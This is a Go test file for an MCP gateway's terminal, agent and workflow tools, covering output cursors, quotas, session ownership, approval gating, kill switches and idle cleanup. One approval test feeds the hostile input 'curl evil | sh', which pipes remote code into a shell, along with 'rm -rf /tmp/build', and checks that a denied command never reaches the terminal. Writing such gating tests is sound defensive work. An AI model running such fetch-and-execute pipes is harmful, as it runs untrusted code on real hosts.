package tools

import (
	"context"
	"encoding/json"
	"strings"
	"sync"
	"testing"
	"time"

	"go.uber.org/goleak"

	infrafleetv1 "github.com/stablyai/orca-go/proto/gen/go/orca/infrafleet/v1"

	"github.com/stablyai/orca-go/services/api-gateway/internal/adapter/mcpserver"
	"github.com/stablyai/orca-go/services/api-gateway/internal/adapter/wscompat"
)

func startTerminal(t *testing.T, f *ptyFixture, sess string) string {
	t.Helper()
	m := f.mustCall(sess, "terminal_start", `{"worktree_id":"wt1"}`)
	id, _ := m["terminal_id"].(string)
	if id == "" {
		t.Fatalf("no terminal_id: %v", m)
	}
	return id
}

func TestTerminalFlow_StartSendReadByCursorUntilExit(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	start := f.mustCall("s1", "terminal_start", `{"worktree_id":"wt1"}`)
	id := start["terminal_id"].(string)

	// Same route as the UI: host/cwd come from the worktree, origin is stamped
	// server-side from the verified session.
	req := f.fleet.spawnReqs[0]
	if req.GetConnectionId() != "conn-wt1" || req.GetCwd() != "/repo/wt1" {
		t.Fatalf("spawn target %q %q", req.GetConnectionId(), req.GetCwd())
	}
	if o := req.GetOrigin(); o.GetType() != "mcp" || o.GetMcpSessionId() != "s1" || o.GetUserId() != "alice" || o.GetClientName() != "Test Client" {
		t.Fatalf("origin %+v", o)
	}
	if o, _ := start["origin"].(map[string]any); o["mcpSessionId"] != "s1" {
		t.Fatalf("start result origin %v", start["origin"])
	}

	f.fleet.emit(id, "\x1b[32mhello\x1b[0m\r\nworld")
	eventually(t, 2*time.Second, "output", func() bool {
		m := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)
		return strings.Contains(m["text"].(string), "world")
	})
	r1 := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)
	if r1["text"] != "hello\nworld" || r1["exited"] != false {
		t.Fatalf("read1 %v", r1)
	}
	next := seqOf(t, r1, "next_seq")
	f.fleet.emit(id, " more\n")
	r2 := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`","since_seq":`+itoa(next)+`,"wait_ms":2000}`)
	if r2["text"] != " more\n" {
		t.Fatalf("read2 %v", r2)
	}

	// send + wait_ms returns the output the command produced.
	go func() {
		time.Sleep(30 * time.Millisecond)
		f.fleet.emit(id, "total 0\n")
	}()
	s := f.mustCall("s1", "terminal_send", `{"terminal_id":"`+id+`","input":"ls","wait_ms":3000,"until_idle_ms":100}`)
	if s["sent"] != true || !strings.Contains(s["text"].(string), "total 0") {
		t.Fatalf("send %v", s)
	}
	if in := f.fleet.inputsOf(id); len(in) != 1 || in[0] != "ls\r" {
		t.Fatalf("pty input %q", in)
	}

	// Read after exit keeps working and reports the exit code; seq stays stable.
	f.fleet.exit(id, 3)
	eventually(t, 2*time.Second, "exit", func() bool {
		return f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)["exited"] == true
	})
	a := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)
	b := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)
	if a["exit_code"].(json.Number).String() != "3" || a["next_seq"] != b["next_seq"] {
		t.Fatalf("after exit %v / %v", a, b)
	}
	if _, err := f.call("s1", alice, "terminal_send", `{"terminal_id":"`+id+`","input":"x"}`); err == nil || !strings.HasPrefix(errText(err), "TERMINAL_EXITED") {
		t.Fatalf("send to an exited terminal: %v", err)
	}
	f.mustCall("s1", "terminal_stop", `{"terminal_id":"`+id+`","force":true}`)
	if len(f.fleet.killed) != 1 {
		t.Fatalf("force stop must close the terminal: %v", f.fleet.killed)
	}
	if _, err := f.call("s1", alice, "terminal_read", `{"terminal_id":"`+id+`"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_NOT_FOUND") {
		t.Fatalf("read after force stop: %v", err)
	}
}

func itoa(v uint64) string { b, _ := json.Marshal(v); return string(b) }

func TestTerminalRead_OldCursorGapAndInvalidCursor(t *testing.T) {
	f := newPtyFixture(t, func(c *PtyToolsConfig) { c.RingBytes = 64 }, nil)
	id := startTerminal(t, f, "s1")
	f.fleet.emit(id, strings.Repeat("a", 200))
	eventually(t, 2*time.Second, "flood", func() bool {
		return f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`"}`)["next_seq"].(json.Number).String() == "200"
	})
	m := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`","since_seq":10}`)
	if seqOf(t, m, "dropped_bytes") != 136-10 || m["truncated"] != true || len(m["text"].(string)) != 64 {
		t.Fatalf("gap read %v", m)
	}
	if _, err := f.call("s1", alice, "terminal_read", `{"terminal_id":"`+id+`","since_seq":9999}`); err == nil || !strings.HasPrefix(errText(err), "INVALID_CURSOR") {
		t.Fatalf("future cursor: %v", err)
	}
	small := f.mustCall("s1", "terminal_read", `{"terminal_id":"`+id+`","max_bytes":10}`)
	if len(small["text"].(string)) != 10 || small["has_more"] != true {
		t.Fatalf("max_bytes cap %v", small)
	}
}

func TestTerminalOutput_IsUntrustedAndMetaIsExec(t *testing.T) {
	cat := newPtyFixture(t, nil, nil).ex.catalog
	for _, tc := range []struct {
		name      string
		untrusted bool
	}{{"terminal_read", true}, {"terminal_send", true}, {"terminal_start", false}, {"agent_send", false}} {
		s, ok := cat.Lookup(tc.name)
		if !ok {
			t.Fatalf("%s missing", tc.name)
		}
		m := s.Meta()
		if m.Risk != mcpserver.RiskExec || m.RequiredScope != "orca:exec" || m.UntrustedOutput != tc.untrusted {
			t.Errorf("%s meta %+v", tc.name, m)
		}
	}
	for _, n := range []string{"agent_start", "agent_status", "agent_stop", "terminal_stop", "terminal_wait", "workflow_run"} {
		if s, _ := cat.Lookup(n); s == nil || s.Risk != mcpserver.RiskExec {
			t.Errorf("%s must be exec", n)
		}
	}
}

type argRecordingGate struct {
	mu       sync.Mutex
	decided  []string // tool + verbatim args
	approved bool
	n        int
}

func (g *argRecordingGate) Decide(_ context.Context, _ mcpserver.Principal, meta mcpserver.ToolMeta, args json.RawMessage) (mcpserver.GateDecision, error) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.decided = append(g.decided, meta.Name+" "+string(args))
	if meta.Risk == mcpserver.RiskExec {
		g.n++
		return mcpserver.GateDecision{Outcome: mcpserver.OutcomeRequireApproval, ApprovalID: "ap-" + itoa(uint64(g.n))}, nil
	}
	return mcpserver.GateDecision{Outcome: mcpserver.OutcomeAllow}, nil
}
func (g *argRecordingGate) AwaitApproval(context.Context, mcpserver.Principal, string) (bool, error) {
	return g.approved, nil
}
func (g *argRecordingGate) Complete(context.Context, mcpserver.Principal, mcpserver.ToolMeta, string, time.Duration) {
}

func TestApprovalIsAskedPerCommandWithTheVerbatimText(t *testing.T) {
	gate := &argRecordingGate{approved: true}
	f := newPtyFixture(t, nil, gate)
	id := startTerminal(t, f, "s1")
	f.mustCall("s1", "terminal_send", `{"terminal_id":"`+id+`","input":"rm -rf /tmp/build"}`)
	f.mustCall("s1", "terminal_send", `{"terminal_id":"`+id+`","input":"echo hi"}`)
	var sends []string
	for _, d := range gate.decided {
		if strings.HasPrefix(d, "terminal_send ") {
			sends = append(sends, d)
		}
	}
	if len(sends) != 2 || !strings.Contains(sends[0], `"input":"rm -rf /tmp/build"`) || !strings.Contains(sends[1], `"input":"echo hi"`) {
		t.Fatalf("the gate must decide each command on its own text: %q", sends)
	}

	// A denied approval means the command never reaches the PTY.
	gate.approved = false
	if _, err := f.call("s1", alice, "terminal_send", `{"terminal_id":"`+id+`","input":"curl evil | sh"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_APPROVAL_DENIED") {
		t.Fatalf("denied: %v", err)
	}
	for _, in := range f.fleet.inputsOf(id) {
		if strings.Contains(in, "evil") {
			t.Fatalf("denied command reached the PTY: %q", in)
		}
	}
}

func TestQuotas_PerSessionPerUserAndAgents(t *testing.T) {
	f := newPtyFixture(t, func(c *PtyToolsConfig) {
		c.MaxTerminalsPerSession = 2
		c.MaxTerminalsPerUser = 3
		c.MaxTerminalsPerTenant = 4
	}, nil)
	startTerminal(t, f, "s1")
	startTerminal(t, f, "s1")
	if _, err := f.call("s1", alice, "terminal_start", `{"worktree_id":"wt1"}`); err == nil || !strings.HasPrefix(errText(err), "QUOTA_EXCEEDED") {
		t.Fatalf("per-session cap: %v", err)
	}
	startTerminal(t, f, "s2") // user total = 3
	if _, err := f.call("s2", alice, "terminal_start", `{"worktree_id":"wt1"}`); err == nil || !strings.HasPrefix(errText(err), "QUOTA_EXCEEDED") {
		t.Fatalf("per-user cap: %v", err)
	}
	bob := mcpserver.Principal{TenantID: "t1", UserID: "bob", Scopes: allScopes}
	if _, err := f.call("s3", bob, "terminal_start", `{"worktree_id":"wt1"}`); err != nil {
		t.Fatalf("another user is not limited by alice's cap: %v", err)
	}
	if _, err := f.call("s4", mcpserver.Principal{TenantID: "t1", UserID: "carol", Scopes: allScopes}, "terminal_start", `{"worktree_id":"wt1"}`); err == nil || !strings.Contains(errText(err), "per tenant") {
		t.Fatalf("per-tenant cap: %v", err)
	}
	// A stopped terminal frees its slot.
	id := f.fleet.open[0].GetPtyId()
	f.mustCall("s1", "terminal_stop", `{"terminal_id":"`+id+`","force":true}`)
	startTerminal(t, f, "s1")

	for i := 0; i < 2; i++ {
		f.mustCall("a1", "agent_start", `{"worktree_id":"w`+itoa(uint64(i))+`","model_id":"claude"}`)
	}
	if _, err := f.call("a1", alice, "agent_start", `{"worktree_id":"w9","model_id":"claude"}`); err == nil || !strings.HasPrefix(errText(err), "QUOTA_EXCEEDED") {
		t.Fatalf("agent cap: %v", err)
	}
}

func TestQuota_UsesTheDurableCountOfOtherReplicas(t *testing.T) {
	f := newPtyFixture(t, func(c *PtyToolsConfig) { c.MaxTerminalsPerUser = 1 }, nil)
	// A terminal created by this user's MCP session on another replica.
	f.fleet.open = append(f.fleet.open, &infrafleetv1.TerminalSession{PtyId: "remote-1", Origin: &infrafleetv1.SessionOrigin{Type: "mcp", McpSessionId: "other-replica-session", UserId: "alice"}})
	if _, err := f.call("s1", alice, "terminal_start", `{"worktree_id":"wt1"}`); err == nil || !strings.HasPrefix(errText(err), "QUOTA_EXCEEDED") {
		t.Fatalf("durable count ignored: %v", err)
	}
}

func TestOwnership_OtherSessionsAndUsersCannotDriveATerminal(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	id := startTerminal(t, f, "s1")
	if _, err := f.call("s2", alice, "terminal_read", `{"terminal_id":"`+id+`"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_NOT_FOUND") {
		t.Fatalf("another MCP session: %v", err)
	}
	bob := mcpserver.Principal{TenantID: "t1", UserID: "bob", Scopes: allScopes}
	if _, err := f.call("s1", bob, "terminal_send", `{"terminal_id":"`+id+`","input":"x"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_NOT_FOUND") {
		t.Fatalf("another user with the same session id: %v", err)
	}
	if len(f.fleet.inputsOf(id)) != 0 {
		t.Fatal("input reached a terminal of another session")
	}
	// A terminal the UI opened is not reachable either.
	if _, err := f.call("s1", alice, "terminal_read", `{"terminal_id":"pty-from-ui"}`); err == nil {
		t.Fatal("UI terminal must not be readable")
	}
}

func TestSessionIsRequiredAndClosedSessionsStayClosed(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	if _, err := f.ex.CallTool(context.Background(), alice, "terminal_start", json.RawMessage(`{"worktree_id":"wt1"}`)); err == nil || !strings.HasPrefix(errText(err), "MCP_SESSION_REQUIRED") {
		t.Fatalf("no session: %v", err)
	}
	startTerminal(t, f, "s1")
	f.ex.CloseSession("s1", "user")
	if _, err := f.call("s1", alice, "terminal_start", `{"worktree_id":"wt1"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_SESSION_CLOSED") {
		t.Fatalf("late call on a closed session: %v", err)
	}
	f.ex.CloseSession("s1", "user") // idempotent
	f.ex.CloseSession("never-seen", "user")
}

func TestStartNeedsAHostAndNeverAssumesLocal(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	if _, err := f.call("s1", alice, "terminal_start", `{}`); err == nil || !strings.HasPrefix(errText(err), "INVALID_ARGUMENTS") {
		t.Fatalf("no worktree/connection: %v", err)
	}
	if _, err := f.call("s1", alice, "terminal_start", `{"worktree_id":"missing"}`); err == nil || !strings.HasPrefix(errText(err), "MCP_NOT_FOUND") {
		t.Fatalf("unknown worktree: %v", err)
	}
	m := f.mustCall("s1", "terminal_start", `{"connection_id":"ssh-conn-9","cwd":"/srv/app"}`)
	if req := f.fleet.spawnReqs[0]; req.GetConnectionId() != "ssh-conn-9" || req.GetCwd() != "/srv/app" || m["terminal_id"] == nil {
		t.Fatalf("explicit connection (SSH) path: %+v", req)
	}
}

func TestReadRateLimit(t *testing.T) {
	f := newPtyFixture(t, func(c *PtyToolsConfig) { c.ReadRate = 1; c.ReadBurst = 3 }, nil)
	id := startTerminal(t, f, "s1")
	var limited error
	for i := 0; i < 6 && limited == nil; i++ {
		_, limited = f.call("s1", alice, "terminal_read", `{"terminal_id":"`+id+`"}`)
	}
	if limited == nil || !strings.HasPrefix(errText(limited), "RATE_LIMITED") || !strings.Contains(errText(limited), "retry_after_ms=") {
		t.Fatalf("expected RATE_LIMITED with retry_after_ms, got %v", limited)
	}
}

func TestAgentFlow_StartStatusSendBusyStop(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	f.fleet.exitOnStop = true
	st := f.mustCall("s1", "agent_start", `{"worktree_id":"wt1","model_id":"claude"}`)
	sid, term := st["session_id"].(string), st["terminal_id"].(string)
	req := f.fleet.agentReqs[0]
	if req.GetUserId() != "alice" || req.GetConnectionId() != "conn-wt1" || req.GetTrustPreset() != "standard" || req.GetOrigin().GetMcpSessionId() != "s1" {
		t.Fatalf("agent.start request %+v", req)
	}
	if o, _ := st["origin"].(map[string]any); o["type"] != "mcp" {
		t.Fatalf("origin in result %v", st["origin"])
	}

	status := f.mustCall("s1", "agent_status", `{"session_id":"`+sid+`"}`)
	if status["agent_running"] != true || status["ready_for_input"] != true || status["exited"] != false {
		t.Fatalf("status %v", status)
	}
	sent := f.mustCall("s1", "agent_send", `{"session_id":"`+sid+`","prompt":"fix the bug"}`)
	if sent["sent"] != true {
		t.Fatalf("send %v", sent)
	}
	if in := f.fleet.inputsOf(term); len(in) != 1 || in[0] != "fix the bug\r" {
		t.Fatalf("agent input %q", in)
	}
	f.fleet.mu.Lock()
	f.fleet.agentReady = false
	f.fleet.mu.Unlock()
	busy := f.mustCall("s1", "agent_send", `{"session_id":"`+sid+`","prompt":"another"}`)
	if busy["sent"] != false || busy["reason"] != "agent_busy" || len(f.fleet.inputsOf(term)) != 1 {
		t.Fatalf("busy %v", busy)
	}
	f.mustCall("s1", "agent_stop", `{"session_id":"`+sid+`"}`)
	if len(f.fleet.agentStops) != 1 {
		t.Fatalf("stops %v", f.fleet.agentStops)
	}
	eventually(t, 2*time.Second, "agent exit", func() bool {
		return f.mustCall("s1", "agent_status", `{"session_id":"`+sid+`"}`)["exited"] == true
	})
	f.mustCall("s1", "agent_stop", `{"session_id":"`+sid+`","force":true}`)
	if len(f.fleet.agentKills) != 1 {
		t.Fatalf("kills %v", f.fleet.agentKills)
	}
}

func TestWorkflowRun_IsIdempotentPerSessionAndStatusIsRead(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	var mu sync.Mutex
	var ids []string
	f.reg.Register("workflow.execute", func(_ context.Context, _ wscompat.Identity, args []json.RawMessage) (any, error) {
		var a struct {
			RequestID  string `json:"requestId"`
			TemplateID string `json:"templateId"`
		}
		_ = json.Unmarshal(args[0], &a)
		mu.Lock()
		ids = append(ids, a.RequestID)
		mu.Unlock()
		return map[string]any{"id": "exec-1", "status": "running", "template_id": a.TemplateID}, nil
	})
	f.reg.Register("workflow.getExecution", func(context.Context, wscompat.Identity, []json.RawMessage) (any, error) {
		return map[string]any{"id": "exec-1", "status": "completed"}, nil
	})
	f.mustCall("s1", "workflow_run", `{"template_id":"tpl"}`)
	f.mustCall("s1", "workflow_run", `{"template_id":"tpl"}`)
	f.mustCall("s2", "workflow_run", `{"template_id":"tpl"}`)
	f.mustCall("s1", "workflow_run", `{"template_id":"tpl","request_id":"again"}`)
	if len(ids) != 4 || ids[0] == "" || ids[0] != ids[1] || ids[0] == ids[2] || ids[3] != "again" {
		t.Fatalf("request ids %v", ids)
	}
	s, _ := f.ex.catalog.Lookup("workflow_run_status")
	if s.Risk != mcpserver.RiskRead || s.Pack != 1 {
		t.Fatalf("workflow_run_status is a pack 1 read: %+v", s)
	}
	if m := f.mustCall("s1", "workflow_run_status", `{"execution_id":"exec-1"}`); m["status"] != "completed" {
		t.Fatalf("status %v", m)
	}
}

// ---- auto-stop & leaks -------------------------------------------------------------

func TestAutoStop_SessionCloseStopsEverythingWithoutLeaks(t *testing.T) {
	defer goleak.VerifyNone(t, goleak.IgnoreCurrent())
	f := newPtyFixture(t, nil, nil)
	t1, t2 := startTerminal(t, f, "s1"), startTerminal(t, f, "s1")
	other := startTerminal(t, f, "s2")                                                 // another session must be untouched
	ag := f.mustCall("s1", "agent_start", `{"worktree_id":"wt9","model_id":"claude"}`) // does not exit on stop -> killed after the grace

	begin := time.Now()
	f.ex.CloseSession("s1", "expired")
	if d := time.Since(begin); d > 10*time.Second {
		t.Fatalf("auto-stop took %v", d)
	}
	f.fleet.mu.Lock()
	killed := append([]string(nil), f.fleet.killed...)
	stops, kills := append([]string(nil), f.fleet.agentStops...), append([]string(nil), f.fleet.agentKills...)
	f.fleet.mu.Unlock()
	if !containsAll(killed, t1, t2) || containsAll(killed, other) {
		t.Fatalf("killed %v (want %s,%s but not %s)", killed, t1, t2, other)
	}
	if len(stops) != 1 || stops[0] != ag["session_id"] || len(kills) != 1 {
		t.Fatalf("agent must be stopped politely then killed: stops=%v kills=%v", stops, kills)
	}
	if f.ex.sessions.Active() != 1 {
		t.Fatalf("only s2 remains, got %d", f.ex.sessions.Active())
	}
	f.ex.Close() // s2 too
	if !containsAll(f.fleet.killed, other) {
		t.Fatalf("shutdown must stop s2 as well: %v", f.fleet.killed)
	}
}

func containsAll(have []string, want ...string) bool {
	for _, w := range want {
		found := false
		for _, h := range have {
			if h == w {
				found = true
			}
		}
		if !found {
			return false
		}
	}
	return true
}

func TestAutoStop_KillSwitchClosesTheSessionsPTYs(t *testing.T) {
	defer goleak.VerifyNone(t, goleak.IgnoreCurrent())
	f := newPtyFixture(t, nil, nil)
	trip := make(chan struct{})
	f.ex.WithGuards(Guards{
		SessionID: func(ctx context.Context) string { s, _ := ctx.Value(sessCtxKey{}).(string); return s },
		WatchKill: func(ctx context.Context, _ mcpserver.Principal) (context.Context, context.CancelFunc) {
			kctx, cancel := context.WithCancel(ctx)
			go func() {
				select {
				case <-trip:
					cancel()
				case <-kctx.Done():
				}
			}()
			return kctx, cancel
		},
	})
	id := startTerminal(t, f, "s1")
	close(trip) // administrator flips the kill switch; no tool call is running
	eventually(t, 5*time.Second, "terminal.close after kill switch", func() bool {
		f.fleet.mu.Lock()
		defer f.fleet.mu.Unlock()
		return len(f.fleet.killed) == 1 && f.fleet.killed[0] == id
	})
	eventually(t, 2*time.Second, "session forgotten", func() bool { return f.ex.sessions.Active() == 0 })
	f.ex.Close()
}

func TestIdleTimeoutStopsAbandonedTerminals(t *testing.T) {
	defer goleak.VerifyNone(t, goleak.IgnoreCurrent())
	var mu sync.Mutex
	var told []string
	f := newPtyFixture(t, func(c *PtyToolsConfig) {
		c.IdleTimeout = 60 * time.Millisecond
		c.JanitorEvery = 10 * time.Millisecond
		c.OnIdleStopped = func(_, _, sess, pty, _ string, err error) {
			if err != nil {
				t.Errorf("idle close failed: %v", err)
			}
			mu.Lock()
			told = append(told, sess+"/"+pty)
			mu.Unlock()
		}
	}, nil)
	id := startTerminal(t, f, "s1")
	eventually(t, 3*time.Second, "idle stop", func() bool {
		f.fleet.mu.Lock()
		defer f.fleet.mu.Unlock()
		return len(f.fleet.killed) == 1
	})
	mu.Lock()
	defer mu.Unlock()
	if len(told) != 1 || told[0] != "s1/"+id {
		t.Fatalf("idle callback %v", told)
	}
	f.fleet.mu.Lock()
	reason := f.fleet.killReason[id]
	f.fleet.mu.Unlock()
	if reason != "idle" {
		t.Fatalf("janitor must close with reason idle (infra-fleet emits the lossless event), got %q", reason)
	}
	f.ex.Close()
}

func TestCloseReasons_PropagateToInfraFleet(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	forced := startTerminal(t, f, "s1")
	f.mustCall("s1", "terminal_stop", `{"terminal_id":"`+forced+`","force":true}`)
	reaped := startTerminal(t, f, "s2")
	closedWithSession := startTerminal(t, f, "s3")
	f.ex.CloseSession("s3", "kill_switch")
	f.ex.sessions.CloseSession("s2", "x") // forget s2 locally so only the durable reaper can close it
	if err := f.ex.ReapSession(context.Background(), "t1", "alice", "s2"); err != nil {
		t.Fatal(err)
	}
	f.fleet.mu.Lock()
	defer f.fleet.mu.Unlock()
	for id, want := range map[string]string{forced: "user", closedWithSession: "session_closed", reaped: "session_closed"} {
		if got := f.fleet.killReason[id]; got != want {
			t.Errorf("terminal %s closed with reason %q, want %q", id, got, want)
		}
	}
	f.ex.Close()
}

func TestSessionCloseWhileToolsRun_NoLeakOrOrphanUnderRace(t *testing.T) {
	defer goleak.VerifyNone(t, goleak.IgnoreCurrent())
	f := newPtyFixture(t, func(c *PtyToolsConfig) {
		c.MaxTerminalsPerSession = 50
		c.MaxTerminalsPerUser = 50
		c.MaxTerminalsPerTenant = 50
	}, nil)
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, _ = f.call("race", alice, "terminal_start", `{"worktree_id":"wt1"}`)
		}()
	}
	time.Sleep(5 * time.Millisecond)
	f.ex.CloseSession("race", "user")
	wg.Wait()
	f.fleet.mu.Lock()
	spawned, killed := len(f.fleet.spawnReqs), len(f.fleet.killed)
	f.fleet.mu.Unlock()
	if spawned != killed {
		t.Fatalf("orphan PTYs: spawned %d, killed %d", spawned, killed)
	}
	f.ex.Close()
}

func TestReapSession_ClosesOnlyTerminalsOfThatMCPSessionAfterAReplicaLostThem(t *testing.T) {
	f := newPtyFixture(t, nil, nil)
	// Terminals as another (now dead) replica left them in infra-fleet.
	mk := func(id, sess, typ string) *infrafleetv1.TerminalSession {
		return &infrafleetv1.TerminalSession{PtyId: id, Origin: &infrafleetv1.SessionOrigin{Type: typ, McpSessionId: sess, UserId: "alice"}}
	}
	f.fleet.open = []*infrafleetv1.TerminalSession{mk("dead-1", "gone", "mcp"), mk("dead-2", "gone", "mcp"),
		mk("other", "alive", "mcp"), {PtyId: "ui-1"}}
	if err := f.ex.ReapSession(context.Background(), "t1", "alice", "gone"); err != nil {
		t.Fatal(err)
	}
	if !containsAll(f.fleet.killed, "dead-1", "dead-2") || len(f.fleet.killed) != 2 {
		t.Fatalf("killed %v", f.fleet.killed)
	}
	if err := f.ex.ReapSession(context.Background(), "t1", "alice", "gone"); err != nil || len(f.fleet.killed) != 2 {
		t.Fatalf("second reap must be a no-op: %v %v", err, f.fleet.killed)
	}
}
